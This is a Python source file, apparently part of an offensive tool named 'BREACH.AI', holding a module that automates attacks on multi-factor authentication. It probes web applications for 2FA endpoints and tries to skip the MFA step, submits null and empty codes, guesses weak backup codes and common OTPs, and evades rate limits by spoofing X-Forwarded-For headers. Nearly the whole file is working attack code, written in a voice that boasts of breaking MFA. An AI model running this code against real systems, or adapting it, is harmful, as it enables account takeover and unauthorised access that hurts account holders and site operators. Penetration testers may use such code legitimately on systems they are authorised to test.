"""
BREACH.AI - MFA Bypass Module

Comprehensive multi-factor authentication bypass module.
MFA is supposed to be the last line of defense - we break it.

Attack Categories:
1. Response Manipulation - Change 2FA response to success
2. Direct Endpoint Access - Skip 2FA step entirely
3. Backup Code Brute Force - Weak backup codes
4. OTP Brute Force - Rate limiting bypass
5. Token Reuse - Same code works multiple times
6. Session Hijacking - Steal post-2FA session
7. Recovery Flow Abuse - Bypass via account recovery
"""

import asyncio
import itertools
import re
import time
from dataclasses import dataclass
from typing import Optional
from urllib.parse import urljoin, urlparse

from breach.attacks.base import AttackResult, BaseAttack
from breach.core.memory import AccessLevel, Severity
from breach.utils.logger import logger


@dataclass
class MFAEndpoint:
    """MFA endpoint information."""
    verify_url: str
    method: str = "POST"
    code_field: str = "code"
    type: str = "totp"  # totp, sms, email, webauthn


class MFABypass(BaseAttack):
    """
    MFA BYPASS - Comprehensive 2FA/MFA exploitation.

    Multi-factor authentication implementations are often flawed.
    We exploit every weakness to achieve full bypass.
    """

    name = "MFA Bypass"
    attack_type = "mfa_bypass"
    description = "Comprehensive multi-factor authentication bypass"
    severity = Severity.CRITICAL
    owasp_category = "A07:2021 Identification and Authentication Failures"
    cwe_id = 287

    # Common MFA verification endpoints
    MFA_ENDPOINTS = [
        "/verify", "/2fa", "/mfa", "/otp", "/totp",
        "/auth/verify", "/auth/2fa", "/auth/mfa",
        "/login/verify", "/login/2fa",
        "/api/verify", "/api/2fa", "/api/mfa",
        "/account/verify", "/security/verify",
        "/two-factor", "/two-factor-auth",
        "/challenge", "/auth/challenge",
    ]

    # Common backup code patterns
    BACKUP_CODE_PATTERNS = [
        "########",  # 8 digits
        "####-####",  # 8 digits with dash
        "########-########",  # 16 digits with dash
        "XXXX-XXXX-XXXX",  # Alphanumeric
    ]

    # Common weak backup codes
    WEAK_BACKUP_CODES = [
        "12345678", "00000000", "11111111", "99999999",
        "12341234", "87654321", "12121212", "10101010",
        "1234-5678", "0000-0000", "1111-1111",
    ]

    def get_payloads(self) -> list[str]:
        return self.WEAK_BACKUP_CODES

    async def check(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> bool:
        """Check if MFA is in use."""
        response = await self.http_client.get(url)

        mfa_indicators = [
            "2fa", "mfa", "two-factor", "multi-factor",
            "verification code", "authenticator",
            "one-time password", "otp", "totp",
            "security code", "sms code", "email code",
        ]

        body_lower = response.body.lower()
        return any(ind in body_lower for ind in mfa_indicators)

    async def exploit(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> AttackResult:
        """Execute comprehensive MFA bypass attacks."""
        result = self._create_result(False, url, parameter)

        # Discover MFA endpoint
        endpoint = await self._discover_mfa_endpoint(url)
        if not endpoint:
            result.details = "No MFA endpoint found"
            return result

        logger.info(f"[MFA] Found endpoint: {endpoint.verify_url}")

        # Attack 1: Direct Endpoint Access (Skip 2FA)
        skip_result = await self._attack_direct_access(url, endpoint)
        if skip_result:
            result.success = True
            result.details = "2FA can be skipped entirely!"
            result.access_gained = AccessLevel.USER
            result.add_evidence(
                "mfa_skip",
                "MFA step can be bypassed by accessing protected pages directly",
                skip_result["url"]
            )
            return result

        # Attack 2: Response Manipulation
        response_result = await self._attack_response_manipulation(endpoint)
        if response_result:
            result.success = True
            result.details = f"Response manipulation: {response_result['type']}"
            result.access_gained = AccessLevel.USER
            result.add_evidence(
                "mfa_response_manipulation",
                "MFA response can be manipulated client-side",
                response_result["details"]
            )
            return result

        # Attack 3: Null/Empty Code
        null_result = await self._attack_null_code(endpoint)
        if null_result:
            result.success = True
            result.details = "MFA accepts null/empty code!"
            result.access_gained = AccessLevel.USER
            result.add_evidence(
                "mfa_null_code",
                "MFA verification accepts null or empty code",
                null_result["payload"]
            )
            return result

        # Attack 4: Code Reuse
        reuse_result = await self._attack_code_reuse(endpoint)
        if reuse_result:
            result.success = True
            result.details = "MFA codes can be reused!"
            result.add_evidence(
                "mfa_code_reuse",
                "MFA codes not invalidated after use",
                reuse_result["details"]
            )

        # Attack 5: Rate Limiting Bypass
        rate_result = await self._attack_rate_limit_bypass(endpoint)
        if rate_result:
            result.success = True
            result.details = f"Rate limit bypass: {rate_result['method']}"
            result.add_evidence(
                "mfa_rate_bypass",
                "MFA verification rate limiting can be bypassed",
                rate_result["details"]
            )

        # Attack 6: Backup Code Brute Force
        backup_result = await self._attack_backup_codes(endpoint)
        if backup_result:
            result.success = True
            result.payload = backup_result["code"]
            result.details = "Weak backup code found!"
            result.access_gained = AccessLevel.USER
            result.add_evidence(
                "mfa_weak_backup",
                "MFA backup codes are weak/predictable",
                backup_result["code"]
            )
            return result

        # Attack 7: OTP Brute Force (if no rate limiting)
        otp_result = await self._attack_otp_bruteforce(endpoint)
        if otp_result:
            result.success = True
            result.details = f"OTP brute forced: {otp_result['code']}"
            result.access_gained = AccessLevel.USER
            result.add_evidence(
                "mfa_otp_bruteforce",
                "MFA OTP brute force possible",
                otp_result["code"]
            )
            return result

        # Attack 8: Status Code Bypass
        status_result = await self._attack_status_code_bypass(endpoint)
        if status_result:
            result.success = True
            result.details = "MFA bypassed via status code manipulation"
            result.add_evidence(
                "mfa_status_bypass",
                "MFA validation based on HTTP status code only",
                status_result["details"]
            )

        # Attack 9: Referrer/Origin Bypass
        origin_result = await self._attack_referrer_bypass(endpoint)
        if origin_result:
            result.success = True
            result.details = "MFA bypassed via Referrer/Origin headers"
            result.add_evidence(
                "mfa_origin_bypass",
                "MFA trusts Referrer/Origin headers",
                origin_result["details"]
            )

        return result

    async def _discover_mfa_endpoint(self, url: str) -> Optional[MFAEndpoint]:
        """Discover MFA verification endpoint."""
        for path in self.MFA_ENDPOINTS:
            mfa_url = urljoin(url, path)
            response = await self.http_client.get(mfa_url)

            if response.status_code in [200, 401, 403]:
                # Look for code input field
                code_field = self._find_code_field(response.body)

                if code_field or "code" in response.body.lower() or "otp" in response.body.lower():
                    return MFAEndpoint(
                        verify_url=mfa_url,
                        code_field=code_field or "code",
                    )

        return None

    def _find_code_field(self, html: str) -> Optional[str]:
        """Find the MFA code input field name."""
        patterns = [
            r'name=["\']([^"\']*code[^"\']*)["\']',
            r'name=["\']([^"\']*otp[^"\']*)["\']',
            r'name=["\']([^"\']*token[^"\']*)["\']',
            r'name=["\']([^"\']*totp[^"\']*)["\']',
            r'name=["\']([^"\']*verify[^"\']*)["\']',
        ]

        for pattern in patterns:
            match = re.search(pattern, html, re.I)
            if match:
                return match.group(1)

        return None

    async def _attack_direct_access(self, url: str, endpoint: MFAEndpoint) -> Optional[dict]:
        """Try to access protected pages directly, skipping MFA."""
        logger.debug("[MFA] Testing direct access bypass...")

        protected_paths = [
            "/dashboard", "/home", "/account", "/profile",
            "/admin", "/settings", "/api/user", "/api/me",
        ]

        for path in protected_paths:
            protected_url = urljoin(url, path)
            response = await self.http_client.get(protected_url)

            # If we get 200 without going through MFA, it's bypassed
            if response.status_code == 200:
                # Check it's not a redirect or error page
                error_indicators = ["login", "signin", "verify", "2fa", "unauthorized"]
                if not any(ind in response.body.lower() for ind in error_indicators):
                    return {"url": protected_url}

        return None

    async def _attack_response_manipulation(self, endpoint: MFAEndpoint) -> Optional[dict]:
        """Test if MFA response can be manipulated."""
        logger.debug("[MFA] Testing response manipulation...")

        # Submit wrong code and analyze response
        response = await self.http_client.post(
            endpoint.verify_url,
            data={endpoint.code_field: "000000"}
        )

        # Check if validation is client-side only
        # Look for JavaScript-based validation
        js_validation_patterns = [
            r'if\s*\([^)]*success[^)]*\)',
            r'\.status\s*===?\s*["\']?success',
            r'response\.ok',
            r'if\s*\([^)]*valid[^)]*\)',
        ]

        for pattern in js_validation_patterns:
            if re.search(pattern, response.body, re.I):
                return {
                    "type": "Client-side validation",
                    "details": "MFA validation appears to be client-side only"
                }

        # Check for JSON response that could be manipulated
        if "application/json" in response.headers.get("Content-Type", ""):
            try:
                import json
                data = json.loads(response.body)
                if "success" in data or "valid" in data or "verified" in data:
                    return {
                        "type": "Manipulable JSON response",
                        "details": f"Response contains manipulable fields: {list(data.keys())}"
                    }
            except json.JSONDecodeError:
                pass

        return None

    async def _attack_null_code(self, endpoint: MFAEndpoint) -> Optional[dict]:
        """Test if null/empty codes are accepted."""
        logger.debug("[MFA] Testing null/empty codes...")

        null_payloads = [
            "",
            "null",
            "undefined",
            "none",
            "0",
            "000000",
            "[]",
            "{}",
        ]

        for payload in null_payloads:
            response = await self.http_client.post(
                endpoint.verify_url,
                data={endpoint.code_field: payload}
            )

            if response.status_code in [200, 302]:
                # Check for success indicators
                success_indicators = ["success", "verified", "welcome", "dashboard"]
                if any(ind in response.body.lower() for ind in success_indicators):
                    return {"payload": payload}

        return None

    async def _attack_code_reuse(self, endpoint: MFAEndpoint) -> Optional[dict]:
        """Test if MFA codes can be reused."""
        logger.debug("[MFA] Testing code reuse...")

        # This requires actually having a valid code
        # We can only detect if there's no clear "already used" error
        test_code = "123456"

        # Submit same code twice
        responses = []
        for _ in range(2):
            response = await self.http_client.post(
                endpoint.verify_url,
                data={endpoint.code_field: test_code}
            )
            responses.append(response)
            await asyncio.sleep(0.5)

        # If both responses are identical, code reuse might be possible
        if len(responses) == 2:
            if responses[0].body == responses[1].body:
                # Check for "already used" type errors
                used_indicators = ["already used", "expired", "invalid", "reused"]
                if not any(ind in responses[1].body.lower() for ind in used_indicators):
                    return {
                        "details": "Same code can be submitted multiple times"
                    }

        return None

    async def _attack_rate_limit_bypass(self, endpoint: MFAEndpoint) -> Optional[dict]:
        """Test for rate limit bypass on MFA verification."""
        logger.debug("[MFA] Testing rate limit bypass...")

        bypass_methods = []

        # Test rapid requests
        success_count = 0
        for i in range(20):
            response = await self.http_client.post(
                endpoint.verify_url,
                data={endpoint.code_field: f"{i:06d}"}
            )
            if response.status_code not in [429, 403]:
                success_count += 1

        if success_count == 20:
            bypass_methods.append("No rate limiting")

        # Test with X-Forwarded-For bypass
        for i in range(5):
            response = await self.http_client.post(
                endpoint.verify_url,
                data={endpoint.code_field: "123456"},
                headers={"X-Forwarded-For": f"192.168.1.{i}"}
            )
            if response.status_code not in [429, 403]:
                bypass_methods.append("X-Forwarded-For bypass")
                break

        if bypass_methods:
            return {
                "method": bypass_methods[0],
                "details": f"Rate limiting bypasses: {', '.join(set(bypass_methods))}"
            }

        return None

    async def _attack_backup_codes(self, endpoint: MFAEndpoint) -> Optional[dict]:
        """Test for weak backup codes."""
        logger.debug("[MFA] Testing weak backup codes...")

        # Look for backup code endpoint
        backup_endpoints = [
            "/backup", "/backup-code", "/recovery-code",
            "/auth/backup", "/2fa/backup",
        ]

        backup_url = None
        for path in backup_endpoints:
            test_url = urljoin(endpoint.verify_url, path)
            response = await self.http_client.get(test_url)
            if response.status_code == 200 and "backup" in response.body.lower():
                backup_url = test_url
                break

        if not backup_url:
            backup_url = endpoint.verify_url  # Use main endpoint

        # Try weak backup codes
        for code in self.WEAK_BACKUP_CODES:
            response = await self.http_client.post(
                backup_url,
                data={endpoint.code_field: code, "backup_code": code}
            )

            if response.status_code in [200, 302]:
                success_indicators = ["success", "verified", "valid"]
                if any(ind in response.body.lower() for ind in success_indicators):
                    return {"code": code}

        return None

    async def _attack_otp_bruteforce(self, endpoint: MFAEndpoint) -> Optional[dict]:
        """Attempt OTP brute force (only if no rate limiting detected)."""
        logger.debug("[MFA] Testing OTP brute force feasibility...")

        # First check if there's rate limiting
        rate_limited = False
        for _ in range(10):
            response = await self.http_client.post(
                endpoint.verify_url,
                data={endpoint.code_field: "000000"}
            )
            if response.status_code == 429:
                rate_limited = True
                break

        if rate_limited:
            return None

        # Try a small subset of OTPs (not full brute force, just feasibility)
        # In real attack, this would be extended
        common_otps = ["000000", "123456", "111111", "654321", "012345"]

        for code in common_otps:
            response = await self.http_client.post(
                endpoint.verify_url,
                data={endpoint.code_field: code}
            )

            if response.status_code in [200, 302]:
                success_indicators = ["success", "verified", "welcome"]
                if any(ind in response.body.lower() for ind in success_indicators):
                    return {"code": code}

        return None

    async def _attack_status_code_bypass(self, endpoint: MFAEndpoint) -> Optional[dict]:
        """Test if MFA validation is based only on status code."""
        logger.debug("[MFA] Testing status code bypass...")

        response = await self.http_client.post(
            endpoint.verify_url,
            data={endpoint.code_field: "invalid"}
        )

        # Some implementations only check if status is 200
        # and client-side JS determines success based on response body
        if response.status_code == 200:
            # Check if there's no server-side redirect/enforcement
            if "invalid" in response.body.lower() or "error" in response.body.lower():
                # Server returns 200 even on failure - might be exploitable
                return {
                    "details": "Server returns 200 on failure. "
                              "Client-side validation might be bypassable."
                }

        return None

    async def _attack_referrer_bypass(self, endpoint: MFAEndpoint) -> Optional[dict]:
        """Test if MFA trusts Referrer/Origin headers."""
        logger.debug("[MFA] Testing Referrer/Origin bypass...")

        # Try with trusted referrer
        trusted_referrers = [
            endpoint.verify_url,
            urljoin(endpoint.verify_url, "/"),
            urljoin(endpoint.verify_url, "/dashboard"),
        ]

        for referrer in trusted_referrers:
            response = await self.http_client.post(
                endpoint.verify_url,
                data={endpoint.code_field: "000000"},
                headers={
                    "Referer": referrer,
                    "Origin": urlparse(referrer).scheme + "://" + urlparse(referrer).netloc,
                }
            )

            # Check if response differs based on referrer
            if response.status_code in [200, 302]:
                if "bypass" not in response.body.lower():
                    return {
                        "details": f"Request accepted with Referer: {referrer}"
                    }

        return None
